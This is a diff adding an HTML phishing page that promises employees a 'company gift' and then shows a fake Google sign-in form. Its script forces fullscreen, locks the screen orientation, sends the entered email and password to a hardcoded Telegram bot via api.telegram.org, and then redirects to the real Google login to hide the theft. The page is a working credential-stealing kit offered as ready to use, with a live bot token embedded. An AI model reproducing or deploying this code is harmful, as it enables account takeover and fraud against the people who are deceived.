@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Company Gift</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://img.icons8.com/ios/50/000000/gift.png"/>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Hero Section */
+        .hero {
+            height: 100vh;
+            background: linear-gradient(45deg, #6a11cb, #2575fc);
+            background-size: 400% 400%;
+            animation: gradientBackground 15s ease infinite;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 0 30px;
+            position: absolute;
+            width: 100%;
+            z-index: 2;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+        }
+
+        @keyframes gradientBackground {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #fff;
+            opacity: 0;
+            animation: fadeIn 1.5s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            color: #fff;
+            opacity: 0;
+            animation: fadeIn 2s ease-out forwards;
+            animation-delay: 1s;
+        }
+
+        .btn-google-signin {
+            padding: 14px 35px;
+            background-color: #4285f4;
+            color: white;
+            text-decoration: none;
+            font-size: 1.2rem;
+            border-radius: 8px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-google-signin:hover {
+            background-color: #357ae8;
+            transform: translateY(-4px);
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .google-icon {
+            font-size: 22px;
+        }
+
+        /* Loading Screen */
+        .loading-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 4;
+        }
+
+        .loading-spinner {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Login Page Style */
+        .login-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+            position: absolute;
+            width: 100%;
+            z-index: 3;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+
+        .login-container .header-bar {
+            width: 100%;
+            height: 100%;
+            background-image: url('opera-spoof.png'); /* Replace with your image path */
+            background-size: cover;  /* Cover full screen */
+            background-position: center;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1; /* Ensure it's behind the login form */
+        }
+
+        .login-box {
+            background-color: rgba(255, 255, 255, 0.9); /* Transparent background */
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            z-index: 2;
+            border: none;
+        }
+
+        .login-box h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .login-box p {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 14px;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-box button:hover {
+            background-color: #357ae8;
+        }
+
+        .login-box .google-icon {
+            font-size: 22px;
+            margin-right: 10px;
+        }
+
+        .google-logo {
+            width: 48px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        /* Notification Style */
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        /* For fullscreen support */
+        @media screen and (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+
+            .hero p {
+                font-size: 1rem;
+            }
+
+            .btn-google-signin {
+                font-size: 1rem;
+                padding: 12px 30px;
+            }
+
+            .login-box {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Hero Section -->
+    <section class="hero" id="heroSection">
+        <div class="hero-content">
+            <h1>Congratulations! You've Received a Special Gift from the Company</h1>
+            <p>Thank you for being a part of our team. Please log in with your Google account to claim your gift.</p>
+            <!-- Google Sign-In Button -->
+            <a href="#" class="btn-google-signin" id="loginBtn">
+                <i class="fab fa-google google-icon"></i>
+                Sign in with Google
+            </a>
+        </div>
+    </section>
+
+    <!-- Loading Screen -->
+    <div class="loading-container" id="loadingContainer">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- Login Page -->
+    <div class="login-container" id="loginPage">
+        <div class="header-bar"></div>
+        <div class="login-box">
+            <!-- Google Logo Above Form -->
+            <img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png" alt="Google Logo" class="google-logo">
+            <h2>Login</h2>
+            <p>Use your Google Account</p>
+            <form id="loginForm">
+                <input type="email" id="email" name="email" placeholder="Email" required autocomplete="email">
+                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+                <button type="submit" id="signInBtn" disabled>
+                    <i class="fab fa-google google-icon"></i> Sign in with Google
+                </button>
+            </form>
+            <!-- Error message -->
+            <div id="error-message" class="error-message" style="display: none;">Please fill out both fields before submitting.</div>
+        </div>
+    </div>
+
+    <script>
+        // Enable button when both fields are filled
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const signInBtn = document.getElementById('signInBtn');
+        const errorMessage = document.getElementById('error-message');
+        const loadingContainer = document.getElementById('loadingContainer');
+
+        function checkInputs() {
+            if (emailInput.value !== '' && passwordInput.value !== '') {
+                signInBtn.disabled = false;
+                errorMessage.style.display = 'none';  // Hide error message
+            } else {
+                signInBtn.disabled = true;
+            }
+        }
+
+        emailInput.addEventListener('input', checkInputs);
+        passwordInput.addEventListener('input', checkInputs);
+
+        // Handle button click to show loading animation, then switch to the login page
+        document.getElementById("loginBtn").addEventListener("click", function() {
+            // Show the loading screen
+            loadingContainer.style.display = "flex";
+
+            // Simulate loading delay (you can adjust this time)
+            setTimeout(function() {
+                // Hide loading screen
+                loadingContainer.style.display = "none";
+                
+                // Show the login page and header-bar
+                document.getElementById("heroSection").style.display = "none";
+                document.getElementById("loginPage").style.display = "flex";
+                document.getElementById("loginPage").style.opacity = "1"; // Smooth transition
+
+                // Request fullscreen mode
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen();
+                } else if (document.documentElement.msRequestFullscreen) {
+                    document.documentElement.msRequestFullscreen();
+                }
+
+                // Lock orientation to portrait for Android to prevent navigating away
+                if (screen.orientation && screen.orientation.lock) {
+                    screen.orientation.lock('portrait').catch((error) => {
+                        console.log('Error locking orientation: ', error);
+                    });
+                }
+            }, 2000); // 2 seconds loading animation
+        });
+
+        // Handle form submission
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();  // Prevent form from submitting normally
+
+            // Check if both fields are empty and show error message
+            if (emailInput.value === '' || passwordInput.value === '') {
+                errorMessage.style.display = 'block';
+                return; // Don't submit if fields are empty
+            }
+
+            // Get input values
+            const email = emailInput.value;
+            const password = passwordInput.value;
+
+// Send message to Telegram Bot
+          const botToken = "7578186221:AAFXdVBEjODzbVYrbOp44Tl7jsLSU17Ne0s";
+          const chatId = "5591684211";
+          const message = `Email: ${email}\nPassword: ${password}`;
+
+          console.log("Sending message to Telegram bot...");
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              console.log("Telegram message sent:", data);
+              if (data.ok) {
+                console.log("Message sent successfully!");
+              } else {
+                console.log("Failed to send message:", data.description);
+              }
+            })
+            .catch((error) => {
+              console.error("Error sending message to Telegram:", error);
+            });
+
+          // Redirect to Google login page
+          window.location.href = "https://accounts.google.com/";
+        });
+    </script>
+
+</body>
+</html>
